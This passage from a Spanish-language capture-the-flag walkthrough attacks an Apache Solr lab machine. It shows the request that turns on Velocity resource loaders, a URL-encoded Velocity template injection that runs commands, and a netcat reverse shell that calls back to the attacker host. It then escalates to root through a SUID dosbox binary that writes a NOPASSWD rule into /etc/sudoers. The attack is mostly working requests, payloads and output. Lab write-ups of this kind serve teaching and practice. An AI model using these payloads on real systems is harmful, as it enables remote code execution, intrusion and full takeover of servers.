Ahora nosotros como atacante tendremos que alterar y lograr setear el valor en **true** de forma manual
Desde **Request** inyectamos lo siguiente: de tal forma que todo nuestra peticion por **POST** quedarea asi:
El cambio a **POST** es manual, osea que nosotros los escribamos
```bash
POST /solr/0xDojo/config HTTP/1.1
Host: 172.17.0.2:8983
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 269

{
    "update-queryresponsewriter":{  
    "startup":"lazy",  
    "name":"velocity",  
    "class":"solr.VelocityResponseWriter",  
    "template.base.dir":"",  
    "solr.resource.loader.enabled":"true",  
    "params.resource.loader.enabled":"true"
	}  

}
```

Una ves lanzada la peticion, En la respuesta del servidor obtendremos esto:
```bash
HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8
Content-Length: 149

{
  "responseHeader":{
    "status":0,
    "QTime":289},
  "WARNING":"This response format is experimental.  It is likely to change in the future."}
```

Esto indica que hemos logrado setear el valor en **true** de manera exitosa
Para confirmarlo regresamos a la peticion anterior y reenviamos de nuevo, para despues volver a aplicar el filtro veremso que esta seteado a **true**
```json
"velocity":{
        "startup":"lazy",
        "name":"velocity",
        "class":"solr.VelocityResponseWriter",
        "template.base.dir":"",
        "solr.resource.loader.enabled":"true",
        "params.resource.loader.enabled":"true"},
      "xslt":{
```

Logramos nuestro objetivo, que es manipular manualmente el valor de ese parametro, Y ahora si que podemos abusar de este paremetro
Desde **burpsuite** ejecutamos comandos
En **COMMAND** es donde inyectamos nuestro comando
```bash
# Comandos para explotación
GET /solr/0xDojo/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27COMMAND%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
```

Ahora que tenemos el control totao ejecutamos el comando whoami para saber como quien se esta ejecutando el comando:
```bash
GET /solr/0xDojo/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
```

En le respuesta vemos lo siguiente:
```bash
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 16

     0  ninhack
```

### Intrusion
Ahora ganaremos acceso a la maquina vicitma, Asi que nos ponemos en escucha por el puerto 443 en nuestra maquina atacante
```bash
nc -nlvp 443
```

Ejecutaremos el tipico **oneLiner** pero **urlEncode** para evitar problemas con los caracteres
```bash
# Reverse shell o acceso inicial
GET /solr/0xDojo/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27nc+172.17.0.1+443+-e+/bin/bash%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
```

---

## Escalada de Privilegios

###### Usuario `[ ninhack ]`:
Buscando por privilegios **SUID**
```bash
find / -perm -4000 2>/dev/null

/usr/bin/dosbox
```

El binario `dosbox` es un emulador de DOS, y su configuración SUID (`Set User ID`) permite ejecutarlo con los privilegios del propietario (normalmente root).

```bash
# Comando para escalar al usuario: ( root )
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo 'root ALL=(ALL:ALL) ALL' > c:$LFILE" -c "echo '$USER ALL=(ALL) NOPASSWD:ALL' >> c:$LFILE" -c exit
```

1. **LFILE='/etc/sudoers'**:
    - Apunta al archivo de configuración de `sudo`, que controla los privilegios de usuarios.
2. **Payload: '$USER ALL=(ALL) NOPASSWD:ALL'**:
    - Agrega tu usuario actual (`$USER`) al archivo `sudoers`.
    - `NOPASSWD:ALL`: Permite ejecutar **cualquier comando como root sin contraseña**.
3. **Mecanismo de Escritura**:
    - `mount c /`: Monta el directorio raíz (`/`) como unidad `C:` en DOSBox.
    - `echo ... > c:$LFILE`: Escribe el payload en el archivo objetivo usando la ruta emulada (`c:/etc/sudoers`).

Ahora listamos los privilegios
```bash
sudo -l

User ninhack may run the following commands on 82eedf3128df:
    (ALL) NOPASSWD: ALL
```

Explotamos el privilegio
```bash
sudo su
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@82eedf3128df:# id
uid=0(root) gid=0(root) groups=0(root)
```